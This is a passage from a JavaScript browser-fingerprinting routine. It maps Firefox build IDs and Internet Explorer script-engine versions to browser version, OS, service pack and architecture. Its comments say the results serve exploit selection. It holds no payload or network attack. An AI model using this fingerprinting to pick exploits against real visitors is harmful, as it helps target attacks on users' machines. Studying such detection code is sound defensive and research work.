			case "20100218022705": ua_version = "3.6.0.4"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100218112915": ua_version = "3.5.8"; os_name = oses_linux; os_vendor = "Mandriva"; arch = arch_x86; break;
			case "20100222120605": ua_version = "3.6.0.5"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "20100222120717": ua_version = "3.6.0.5"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100301015346": ua_version = "3.6.0"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86; break;
			case "20100305054927": ua_version = "3.6.0"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86_64; break;
			case "20100307204001": ua_version = "3.6.0"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86; break;
			case "20100308142847": ua_version = "3.6.0.6"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "20100308151019": ua_version = "3.6.0.6"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "2010031218": ua_version = "3.0.19"; break; // Mac OS X or Linux
			case "2010031422": ua_version = "3.0.19"; os_name = oses_windows; break;
			case "20100315075757": ua_version = "3.5.9"; os_name = oses_linux; break;
			case "20100315080228": ua_version = "3.5.9"; os_name = oses_mac_osx; break;
			case "20100315083431": ua_version = "3.5.9"; os_name = oses_windows; break;
			case "20100316055951": ua_version = "3.6.2"; os_name = oses_mac_osx; break;
			case "20100316060223": ua_version = "3.6.2"; os_name = oses_linux; break;
			case "20100316074819": ua_version = "3.6.2"; os_name = oses_windows; break;
			case "2010031700": ua_version = "3.5.9"; os_name = oses_linux; os_vendor = "SUSE"; break;
			case "20100323102218": ua_version = "3.6.2"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86_64; break;
			case "20100323102339": ua_version = "3.6.2"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86; break;
			case "20100323194640": ua_version = "3.6.2"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86_64; break;
			case "20100324182054": ua_version = "3.6.2"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86; break;
			case "20100330071911": ua_version = "3.5.9"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86_64; break;
			case "20100330072017": ua_version = "3.5.9"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86_64; break;
			case "20100330072020": ua_version = "3.5.9"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86; break;
			case "20100330072034": ua_version = "3.5.9"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86; break;
			case "20100401064631": ua_version = "3.6.3"; os_name = oses_mac_osx; break;
			case "20100401074458": ua_version = "3.6.3"; os_name = oses_linux; break;
			case "20100401080539": ua_version = "3.6.3"; os_name = oses_windows; break;
			case "20100401144201": ua_version = "3.6.2"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2010040116": ua_version = "3.0.19"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2010040118": ua_version = "3.0.19"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2010040119": ua_version = "3.0.19"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "20100401213457": ua_version = "3.5.9"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "2010040121": ua_version = "3.0.19"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "2010040123": ua_version = "3.0.19"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "2010040200": ua_version = "3.0.19"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100402010516": ua_version = "3.5.9"; os_name = oses_linux; os_vendor = "Mint"; arch = arch_x86_64; break;
			case "20100402041908": ua_version = "3.6.2"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100403042003": ua_version = "3.6.3"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86_64; break;
			case "20100403082016": ua_version = "3.6.3"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86; break;
			case "20100404024515": ua_version = "3.6.3"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "20100404024646": ua_version = "3.6.3"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100404104043": ua_version = "3.6.3"; os_name = oses_linux; os_vendor = "PClinuxOS"; arch = arch_x86_64; break;
			case "20100409151117": ua_version = "3.6.3.2"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "20100409170726": ua_version = "3.6.3.2"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100412125148": ua_version = "3.6.3"; os_name = oses_linux; os_vendor = "Mandriva"; arch = arch_x86; break;
			case "20100413152922": ua_version = "3.6.4.b1"; os_name = oses_mac_osx; break;
			case "20100413154310": ua_version = "3.6.4.b1"; os_name = oses_linux; break;
			case "20100413172113": ua_version = "3.6.4.b1"; os_name = oses_windows; break;
			case "20100415062243": ua_version = "3.6.3.3"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "20100415103754": ua_version = "3.6.3.3"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100416101101": ua_version = "3.6.3.2"; os_name = oses_linux; os_vendor = "Mandriva"; arch = arch_x86; break;
			case "2010041700": ua_version = "3.6.4.1"; os_name = oses_linux; os_vendor = "SUSE"; break;
			case "20100419015333": ua_version = "3.6.3"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86_64; break;
			case "20100423043606": ua_version = "3.6.3"; os_name = oses_linux; os_vendor = "Sabayon"; arch = arch_x86_64; break;
			case "20100423140709": ua_version = "3.6.3"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "20100423141150": ua_version = "3.6.3"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100423142835": ua_version = "3.6.3"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86; break;
			case "20100502202326": ua_version = "3.6.4.b2"; os_name = oses_linux; break;
			case "20100502202401": ua_version = "3.6.4.b2"; os_name = oses_mac_osx; break;
			case "20100502221517": ua_version = "3.6.4.b2"; os_name = oses_windows; break;
			case "20100503113315": ua_version = "3.6.4.b3"; os_name = oses_mac_osx; break;
			case "20100503113541": ua_version = "3.6.4.b3"; os_name = oses_linux; break;
			case "20100503122926": ua_version = "3.6.4.b3"; os_name = oses_windows; break;
			case "20100504085637": ua_version = "3.5.10"; os_name = oses_linux; break;
			case "20100504085753": ua_version = "3.5.10"; os_name = oses_mac_osx; break;
			case "20100504093643": ua_version = "3.5.10"; os_name = oses_windows; break;
			case "2010050600": ua_version = "3.5.10"; os_name = oses_linux; os_vendor = "SUSE"; break;
			case "2010051300": ua_version = "3.6.4.1"; os_name = oses_linux; os_vendor = "SUSE"; break;
			case "20100513134853": ua_version = "3.6.4.b4"; os_name = oses_mac_osx; break;
			case "20100513140540": ua_version = "3.6.4.b4"; os_name = oses_linux; break;
			case "20100513144105": ua_version = "3.6.4.b4"; os_name = oses_windows; break;
			case "20100513190740": ua_version = "3.6.3"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86_64; break;
			case "20100523180910": ua_version = "3.6.4.b5"; os_name = oses_mac_osx; break;
			case "20100523181754": ua_version = "3.6.4.b5"; os_name = oses_linux; break;
			case "20100523185824": ua_version = "3.6.4.b5"; os_name = oses_windows; break;
			case "20100527084110": ua_version = "3.6.4.b6"; os_name = oses_mac_osx; break;
			case "20100527085242": ua_version = "3.6.4.b6"; os_name = oses_linux; break;
			case "20100527093236": ua_version = "3.6.4.b6"; os_name = oses_windows; break;
			case "2010061100": ua_version = "3.6.4"; os_name = oses_linux; os_vendor = "SUSE"; break;
			case "20100611134546": ua_version = "3.6.4.b7"; os_name = oses_mac_osx; break;
			case "20100611135942": ua_version = "3.6.4.b7"; os_name = oses_linux; break;
			case "20100611143157": ua_version = "3.6.4.b7"; os_name = oses_windows; break;
			case "20100622203044": ua_version = "3.6.4"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86_64; break;
			case "20100622203045": ua_version = "3.6.4"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86; break;
			case "20100622204750": ua_version = "3.5.10"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86_64; break;
			case "20100622204830": ua_version = "3.5.10"; os_name = oses_linux; os_vendor = "Fedora"; arch = arch_x86; break;
			case "20100622205038": ua_version = "3.6.4"; os_name = oses_linux; os_vendor = "PClinuxOS"; arch = arch_x86_64; break;
			case "20100623081410": ua_version = "3.6.4"; os_name = oses_linux; os_vendor = "CentOS"; arch = arch_x86_64; break;
			case "20100623081921": ua_version = "3.6.4"; os_name = oses_linux; os_vendor = "CentOS"; arch = arch_x86; break;
			case "20100623155731": ua_version = "3.6.4.b7"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "20100623200132": ua_version = "3.6.4.b7"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100625222733": ua_version = "3.6.6"; os_name = oses_linux; break;
			case "20100625223402": ua_version = "3.6.6"; os_name = oses_mac_osx; break;
			case "20100625231939": ua_version = "3.6.6"; os_name = oses_windows; break;
			case "20100626104508": ua_version = "3.6.4"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86; break;
			case "20100627211341": ua_version = "3.6.4"; os_name = oses_freebsd; os_vendor = "PC-BSD"; arch = arch_x86_64; break;
			case "20100628082832": ua_version = "3.6.6"; os_name = oses_linux; os_vendor = "PClinuxOS"; arch = arch_x86_64; break;
			case "20100628124739": ua_version = "3.6.6"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "20100628143222": ua_version = "3.6.6"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100628232431": ua_version = "3.6.6"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "20100629034705": ua_version = "3.6.6"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100629105354": ua_version = "3.6.6"; os_name = oses_linux; os_vendor = "Mandriva"; arch = arch_x86; break;
			case "20100630130433": ua_version = "3.6.6"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100630131607": ua_version = "4.0.0.b1"; os_name = oses_mac_osx; break;
			case "20100630132217": ua_version = "4.0.0.b1"; os_name = oses_linux; break;
			case "20100630141702": ua_version = "4.0.0.b1"; os_name = oses_windows; break;
			case "20100630174226": ua_version = "3.6.6"; os_name = oses_linux; os_vendor = "Sabayon"; arch = arch_x86_64; break;
			case "20100630180611": ua_version = "3.6.6"; os_name = oses_linux; os_vendor = "Sabayon"; arch = arch_x86; break;
			case "20100709115208": ua_version = "3.6.7.b1"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86; break;
			case "20100709183408": ua_version = "3.6.7.b1"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20100716093011": ua_version = "3.6.7.b2"; os_name = oses_linux; os_vendor = "Ubuntu"; arch = arch_x86_64; break;
			case "20101203075014": ua_version = "3.6.13"; os_name = oses_windows; break;
			case "20101206122825": ua_version = "3.6.13"; os_name = oses_linux; os_vendor = "Ubuntu"; break;
			case "20110318052756": ua_version = "4.0"; os_name = oses_windows; break; // browsershots: Firefox 4.0 / Windows XP
			case "20110420144310": ua_version = "3.5.19"; os_name = oses_linux; os_vendor = "Debian"; break; // browsershots: Firefox 3.5.19 / Debian 4.0 (Etch)
			case "20110615151330": ua_version = "5.0"; os_name = oses_windows; break; // browsershots: Firefox 5.0 / Windows XP
			case "20110811165603": ua_version = "6.0"; os_name = oses_windows; break; // browsershots: Firefox 6.0 / Windows XP
			case "20110830092941": ua_version = "6.0.1"; os_name = oses_linux; os_vendor = "Debian"; break; // browsershots: Firefox 6.0.1 / Debian 4.0 (Etch)
			case "20110922153450": ua_version = "7.0"; os_name = oses_windows; break; // browsershots: Firefox 7.0 / Windows XP
			case "20110928134238": ua_version = "7.0.1"; os_name = oses_linux; os_vendor = "Debian"; break; // browsershots: Firefox 7.0.1 / Debian 4.0 (Etch)
			case "20111104165243": ua_version = "8.0"; os_name = oses_windows; break; // browsershots: Firefox 8.0 / Windows XP
			case "20111115183813": ua_version = "8.0"; os_name = oses_linux; os_vendor = "Ubuntu"; break; // browsershots: Firefox 8.0 / Ubuntu 9.10 (Karmic Koala)
			case "20111216140209": ua_version = "9.0"; os_name = oses_windows; break; // browsershots: Firefox 9.0 / Windows XP
			case "20120129021758": ua_version = "10.0"; os_name = oses_windows; break; // browsershots: Firefox 10.0 / Windows 2000
			case "20120201083324": ua_version = "3.5.16"; os_name = oses_linux; os_vendor = "Debian"; break; // browsershots: Iceweasel 3.5.16 / Debian 4.0 (Etch)
			case "20120216013254": ua_version = "3.6.27"; os_name = oses_linux; os_vendor = "Debian"; break; // browsershots: Firefox 3.6.27 / Debian 4.0 (Etch)
			case "20120216100510": ua_version = "10.0.2"; os_name = oses_linux; os_vendor = "Ubuntu"; break; // browsershots: Firefox 10.0.2 / Ubuntu 9.10 (Karmic Koala)
			case "20120310010316": ua_version = "11.0"; os_name = oses_linux; os_vendor = "Ubuntu"; break; // browsershots: Firefox 11.0 / Ubuntu 9.10 (Karmic Koala)
			case "20120310194926": ua_version = "11.0"; os_name = oses_linux; os_vendor = "Ubuntu"; break;
			case "20120312181643":
				// It is disconcerting that a buildID is the same on Windows
				// and Mac, need to examine more versions on Mac.
				ua_version = "11.0";
				if (/Mac/.test(navigator.oscpu)) {
					os_name = oses_mac_osx;
				} else {
					os_name = oses_windows; // browsershots: Firefox 11.0 / Windows XP
				}
				break;
			case "20120314195616": ua_version = "12.0"; os_name = oses_linux; os_vendor = "Debian"; break; // browsershots: Firefox 12.0 / Debian 4.0 (Etch)
			case "20120423142301": ua_version = "12.0"; os_name = oses_linux; os_vendor = "Ubuntu"; break;
			case "20120424151700": ua_version = "12.0"; os_name = oses_linux; os_vendor = "Fedora"; break;
			default:
				version = this.searchVersion("Firefox", navigator.userAgent);
				// Verify whether the ua string is lying by checking if it contains
				// the major version we detected using known objects above.  If it
				// appears to be truthful, then use its more precise version number.
				if (version && ua_version && version.split(".")[0] == ua_version.split(".")[0]) {
					// The version number will sometimes end with a space or end of
					// line, so strip off anything after a space if one exists
					if (-1 != version.indexOf(" ")) {
						version = version.substr(0,version.indexOf(" "));
					}
					ua_version = version;
				} else {
					ua_is_lying = true;
				}
				break;
		}
		//if (ua_is_lying) { alert("UA is lying"); }
		//alert(ua_version + " vs " + navigator.userAgent);

		// end navigator.buildID checks

	} else if (typeof ScriptEngineMajorVersion == "function") {
		// Then this is IE and we can very reliably detect the OS.
		// Need to add detection for IE on Mac.  Low priority, since we
		// don't have any sploits for it yet and it's a very low market
		// share.
		os_name = oses_windows;
		ua_name = clients_ie;
		version_maj   = ScriptEngineMajorVersion().toString();
		version_min   = ScriptEngineMinorVersion().toString();
		version_build = ScriptEngineBuildVersion().toString();

		version = version_maj + version_min + version_build;

		//document.write("ScriptEngine: "+version+"<br />");
		switch (version){
			case "514615":
				// IE 5.00.2920.0000, 2000 Advanced Server SP0 English
				ua_version = "5.0";
				os_name = "Windows 2000";
				os_sp = "SP0";
				break;
			case "515907":
				os_name = "Windows 2000";
				os_sp = "SP3";	//or SP2: oCC.getComponentVersion('{22d6f312-b0f6-11d0-94ab-0080c74c7e95}', 'componentid') => 6,4,9,1109
				break;
			case "518513":
				os_name = "Windows 2000";
				os_sp = "SP4";
				break;
			case "566626":
				// IE 6.0.2600.0000, XP SP0 English
				// IE 6.0.2800.1106, XP SP1 English
				ua_version = "6.0";
				os_name = "Windows XP";
				os_sp = "SP0";
				break;
			case "568515":
				// IE 6.0.3790.0, 2003 Standard SP0 English
				ua_version = "6.0";
				os_name = "Windows 2003";
				os_sp = "SP0";
				break;
			case "568820":
				// IE 6.0.2900.2180, xp sp2 english
				os_name = "Windows XP";
				os_sp = "SP2";
				break;
			case "568827":
				os_name = "Windows 2003";
				os_sp = "SP1";
				break;
			case "568831":	//XP SP2 -OR- 2K SP4
				if (os_name == "2000"){
					os_sp = "SP4";
				}
				else{
					os_name = "Windows XP";
					os_sp = "SP2";
				}
				break;
			case "568832":
				os_name = "Windows 2003";
				os_sp = "SP2";
				break;
			case "568837":
				// IE 6.0.2900.2180, XP Professional SP2 Korean
				ua_version = "6.0";
				os_name = "Windows XP";
				os_sp = "SP2";
				break;
			case "5716599":
				// IE 7.0.5730.13, XP Professional SP3 English
				// IE 6.0.2900.5512, XP Professional SP3 English
				// IE 6.0.2900.5512, XP Professional SP3 Spanish
				//
				// Since this scriptengine applies to more than one major version of
				// IE, rely on the object detection below to determine ua_version.
				//ua_version = "6.0";
				os_name = "Windows XP";
				os_sp = "SP3";
				break;
			case "575730":
				// IE 7.0.5730.13, Server 2003 Standard SP2 English
				// IE 7.0.5730.13, Server 2003 Standard SP1 English
				// IE 7.0.5730.13, XP Professional SP2 English
				// Rely on the user agent matching above to determine the OS.
				// This will incorrectly identify 2k3 SP1 as SP2
				ua_version = "7.0";
				os_sp = "SP2";
				break;
			case "5718066":
				// IE 7.0.5730.13, XP Professional SP3 English
				ua_version = "7.0";
				os_name = "Windows XP";
				os_sp = "SP3";
				break;
			case "5722589":
				// IE 7.0.5730.13, XP Professional SP3 English
				ua_version = "7.0";
				os_name = "Windows XP";
				os_sp = "SP3";
				break;
			case "576000":
				// IE 7.0.6000.16386, Vista Ultimate SP0 English
				ua_version = "7.0";
				os_name = "Windows Vista";
				os_sp = "SP0";
				break;
			case "580":
				// IE 8.0.7100.0, Windows 7 English
				// IE 8.0.7100.0, Windows 7 64-bit English
			case "5816385":
				// IE 8.0.7600.16385, Windows 7 English
			case "5816475":
			case "5816762":
				// IE 8.0.7600.16385, Windows 7 English
				ua_version = "8.0";
				os_name = "Windows 7";
				os_sp = "SP0";
				break;
			case "5817514":
				// IE 8.0.7600.17514, Windows 7 SP1 English
				ua_version = "8.0";
				os_name = "Windows 7";
				os_sp = "SP1";
				break;
			case "5818702":
				// IE 8.0.6001.18702, XP Professional SP3 English
			case "5822960":
				// IE 8.0.6001.18702, XP Professional SP3 Greek
				ua_version = "8.0";
				os_name = "Windows XP";
				os_sp = "SP3";
				break;
			case "9016406":
				// IE 9.0.7930.16406, Windows 7 64-bit
				ua_version = "9.0";
				os_name = "Windows 7";
				os_sp = "SP0";
				break;
			case "9016441":
				// IE 9.0.8112.16421, Windows 7 32-bit English
				ua_version = "9.0";
				os_name = "Windows 7";
				os_sp = "SP1";
				break;
			case "9016443":
				// IE 9.0.8112.16421, Windows 7 Polish
				// Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)
				ua_version = "9.0";
				os_name = "Windows 7";
				os_sp = "SP1";
				break;
			case "9016446":
				// IE 9.0.8112.16421, Windows 7 English (Update Versions: 9.0.7 (KB2699988)
				// Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MASA; InfoPath.3; MS-RTC LM 8; BRI/2)Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MASA; InfoPath.3; MS-RTC LM 8; BRI/2)
				ua_version = "9.0";
				os_name = "Windows 7";
				os_sp = "SP1";
				break;
			case "9016464":
				// browsershots.org, MSIE 7.0 / Windows 2008 R2
				os_name = "Windows 2008 R2";
				ua_version = "9.0";
				break;
			case "9016470":
				// IE 9.0.8112.16421 / Windows 7 SP1
				ua_version = "9.0";
				os_name = "Windows 7";
				os_sp = "SP1";
				break;
			case "9016502":
				// IE 9.0.8112.16502 / Windows 7 SP1
				ua_version = "9.0";
				os_name = "Windows 7";
				os_sp = "SP1";
				break;
			case "9016506":
				// IE 9.0.8112.16506 / Windows 7 SP1
				ua_version = "9.0";
				os_name = "Windows 7";
				os_sp = "SP1";
				break;
			case "9016514":
				// IE 9.0.8112.16514 / Windows 7 SP1
				ua_version = "9.0";
				os_name = "Windows 7";
				os_sp = "SP1";
				break;
			case "9016520":
				// IE 9.0.8112.16520 / Windows 7 SP1
				ua_version = "9.0";
				os_name = "Windows 7";
				os_sp = "SP1";
				break;
			case "9016526":
				// IE 9.0.8112.16526 / Windows 7 SP1
				ua_version = "9.0";
				os_name = "Windows 7";
				os_sp = "SP1";
				break;
			case "9016533":
				// IE 9.0.8112.16533 / Windows 7 SP1
				ua_version = "9.0";
				os_name = "Windows 7";
				os_sp = "SP1";
				break;
			case "10016720":
				// IE 10.0.9200.16721 / Windows 7 SP1
				ua_version = "10.0";
				os_name = "Windows 7";
				os_sp = "SP1";
				break;
			case "11016428":
				// IE 11.0.9600.16428 / Windows 7 SP1
				ua_version = "11.0";
				os_name = "Windows 7";
				os_sp = "SP1";
				break;
			case "10016384":
				// IE 10.0.9200.16384 / Windows 8 x86
				ua_version = "10.0";
				os_name = "Windows 8";
				os_sp = "SP0";
				break;
			case "11016426":
				// IE 11.0.9600.16476 / KB2898785 (Technically: 11.0.2) Windows 8.1 x86 English
				ua_version = "11.0";
				os_name = "Windows 8.1";
				break;
			case "1000":
				// IE 10.0.8400.0 (Pre-release + KB2702844), Windows 8 x86 English Pre-release
				ua_version = "10.0";
				os_name = "Windows 8";
				os_sp = "SP0";
				break;
			case "1100":
				// IE 11.0.10011.0 Windows 10.0 (Build 10074) English - insider preview
				ua_version = "11.0";
				os_name = "Windows 10";
				os_sp = "SP0";
				break;
			default:
				unknown_fingerprint = version;
				break;
		}

		if (!ua_version) {
			// The ScriptEngine functions failed us, try some object detection
			if (document.documentElement && (typeof document.documentElement.style.maxHeight)!="undefined") {
				// IE 11 detection, see: http://msdn.microsoft.com/en-us/library/ie/bg182625(v=vs.85).aspx
				try {
					if (document.__proto__ != undefined) { ua_version = "11.0"; }
				} catch (e) {}

				// IE 10 detection using nodeName
				if (!ua_version) {
					try {
						var badNode = document.createElement && document.createElement("badname");
						if (badNode && badNode.nodeName === "BADNAME") { ua_version = "10.0"; }
					} catch(e) {}
				}

				// IE 9 detection based on a "Object doesn't support property or method" error
				if (!ua_version) {
					try {
						document.BADNAME();
					} catch(e) {
						if (e.message.indexOf("BADNAME") > 0) {
							ua_version = "9.0";
						}
					}
				}

				// IE8 detection straight from IEBlog.  Thank you Microsoft.
				if (!ua_version) {
					try {
						ua_version = "8.0";
						document.documentElement.style.display = "table-cell";
					} catch(e) {
						// This executes in IE7,
						// but not IE8, regardless of mode
						ua_version = "7.0";
					}
				}
			} else if (document.compatMode) {
				ua_version = "6.0";
			} else if (window.createPopup) {
				ua_version = "5.5";
			} else if (window.attachEvent) {
				ua_version = "5.0";
			} else {
				ua_version = "4.0";
			}
			switch (navigator.appMinorVersion){
				case ";SP2;":
					os_sp = "SP2";
					break;
			}
		}
	}

	if (!os_name && navigator.platform == "Win32") { os_name = oses_windows; }

	//--
	// Figure out the type of Windows
	//--
	if (!ua_is_lying) {
		version = useragent.toLowerCase();
	} else if (navigator.oscpu) {
		// Then this is Gecko and we can get at least os_name without the
		// useragent
		version = navigator.oscpu.toLowerCase();
	} else {
		// All we have left is the useragent and we know it's lying, so don't bother
		version = " ";
	}
	if (!os_name || 0 == os_name.length) {
		if (version.indexOf("windows") != -1)    { os_name = oses_windows; }
		else if (version.indexOf("mac") != -1)   { os_name = oses_mac_osx; }
		else if (version.indexOf("linux") != -1) { os_name = oses_linux;   }
	}
	if (os_name == oses_windows) {
		if (version.indexOf("windows 95") != -1)          { os_name = "Windows 95";    }
		else if (version.indexOf("windows nt 4") != -1)   { os_name = "Windows NT";    }
		else if (version.indexOf("win 9x 4.9") != -1)     { os_name = "Windows ME";    }
		else if (version.indexOf("windows 98") != -1)     { os_name = "Windows 98";    }
		else if (version.indexOf("windows nt 5.0") != -1) { os_name = "Windows 2000";  }
		else if (version.indexOf("windows nt 5.1") != -1) { os_name = "Windows XP";    }
		else if (version.indexOf("windows nt 5.2") != -1) { os_name = "Windows 2003";  }
		else if (version.indexOf("windows nt 6.0") != -1) { os_name = "Windows Vista"; }
		else if (version.indexOf("windows nt 6.1") != -1) { os_name = "Windows 7";     }
		else if (version.indexOf("windows nt 6.2") != -1) { os_name = "Windows 8";     }
		else if (version.indexOf("windows nt 6.3") != -1) { os_name = "Windows 8.1";   }
	}
	if (os_name == oses_linux && (!os_vendor || 0 == os_vendor.length)) {
		if (version.indexOf("gentoo") != -1)       { os_vendor = "Gentoo";  }
		else if (version.indexOf("ubuntu") != -1)  { os_vendor = "Ubuntu";  }
		else if (version.indexOf("debian") != -1)  { os_vendor = "Debian";  }
		else if (version.indexOf("rhel") != -1)    { os_vendor = "RHEL";    }
		else if (version.indexOf("red hat") != -1) { os_vendor = "RHEL";    }
		else if (version.indexOf("centos") != -1)  { os_vendor = "CentOS";  }
		else if (version.indexOf("fedora") != -1)  { os_vendor = "Fedora";  }
		else if (version.indexOf("android") != -1) { os_vendor = "Android"; }
	}

	//--
	// Language
	//--
	if (navigator.systemLanguage) {
		// ie
		os_lang = navigator.systemLanguage;
	} else if (navigator.language) {
		// gecko derivatives, safari, opera
		os_lang = navigator.language;
	} else {
		// some other browser and we don't know how to get the language, so
		// just guess english
		os_lang = "en";
	}

	//--
	// Architecture
	//--
	if (typeof(navigator.cpuClass) != 'undefined') {
		// Then this is IE or Opera9+ and we can grab the arch directly
		switch (navigator.cpuClass) {
			case "x86":
				arch = arch_x86;
				break;
			case "x64":
				arch = arch_x86_64;
				break;
		}
	}
	if (!arch || 0 == arch.length) {
		// We don't have the handy-dandy navagator.cpuClass, so infer from
		// platform
		version = navigator.platform;
		//document.write(version + "\\n");
		// IE 8 does a bit of wacky user-agent switching for "Compatibility View";
		// 64-bit client on Windows 7, 64-bit:
		//     Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0)
		// 32-bit client on Windows 7, 64-bit:
		//     Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)
		// 32-bit client on Vista, 32-bit, "Compatibility View":
		//     Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)
		//
		// Report 32-bit client on 64-bit OS as being 32 because exploits will
		// need to know the bittedness of the process, not the OS.
		if ( ("Win32" == version) || (version.match(/i.86/)) ) {
			arch = arch_x86;
		} else if (-1 != version.indexOf('x64') || (-1 != version.indexOf('x86_64')))  {
			arch = arch_x86_64;
		} else if (-1 != version.indexOf('PPC'))  {
			arch = arch_ppc;
		}
	}

	this.ua_is_lying = ua_is_lying;
	this.os_name = os_name;
	this.os_vendor = os_vendor;
	this.os_flavor = os_flavor;
	this.os_device = os_device;
	this.os_sp = os_sp;
	this.os_lang = os_lang;
	this.arch = arch;
	this.ua_name = ua_name;
	this.ua_version = ua_version;
	this.ua_version = ua_version;

	return { os_name:os_name, os_vendor:os_vendor, os_flavor:os_flavor, os_device:os_device, os_sp:os_sp, os_lang:os_lang, arch:arch, ua_name:ua_name, ua_version:ua_version };
}; // function getVersion

os_detect.searchVersion = function(needle, haystack) {
	var index = haystack.indexOf(needle);
	var found_version;
	if (index == -1) { return; }
	found_version = haystack.substring(index+needle.length+1);
	if (found_version.indexOf(' ') != -1) {
		// Strip off any junk at the end such as a CLR declaration
		found_version = found_version.substring(0,found_version.indexOf(' '));
	}
	return found_version;
};


/*
 * Return -1 if a < b, 0 if a == b, 1 if a > b
 */
ua_ver_cmp = function(ver_a, ver_b) {
	// shortcut the easy case
	if (ver_a == ver_b) {
		return 0;
	}

	a = ver_a.split(".");
	b = ver_b.split(".");
	for (var i = 0; i < Math.max(a.length, b.length); i++) {
		// 3.0 == 3
		if (!b[i]) { b[i] = "0"; }
		if (!a[i]) { a[i] = "0"; }

		if (a[i] == b[i]) { continue; }

		a_int = parseInt(a[i]);
		b_int = parseInt(b[i]);
		a_rest = a[i].substr(a_int.toString().length);
		b_rest = b[i].substr(b_int.toString().length);
		if (a_int < b_int) {
			return -1;
		} else if (a_int > b_int) {
			return 1;
		} else { // ==
			// Then we need to deal with the stuff after the ints, e.g.:
			// "b4pre"
			if (a_rest == "b" && b_rest.length == 0) {
				return -1;
			}
			if (b_rest == "b" && a_rest.length == 0) {
				return 1;
			}
			// Just give up and try a lexicographical comparison
			if (a_rest < b_rest) {
				return -1;
			} else if (a_rest > b_rest) {
				return 1;
			}
		}
	}
	// If we get here, they must be equal
	return 0;
};

ua_ver_lt = function(a, b) {
	if (-1 == this.ua_ver_cmp(a,b)) { return true; }
	return false;
};
ua_ver_gt = function(a, b) {
	if (1 == this.ua_ver_cmp(a,b)) { return true; }
	return false;
};
ua_ver_eq = function(a, b) {
	if (0 == this.ua_ver_cmp(a,b)) { return true; }
	return false;
};

function make_xhr(){
    var xhr;
            try {
                xhr = new XMLHttpRequest();
            } catch(e) {
                try {
                    xhr = new ActiveXObject("Microsoft.XMLHTTP");
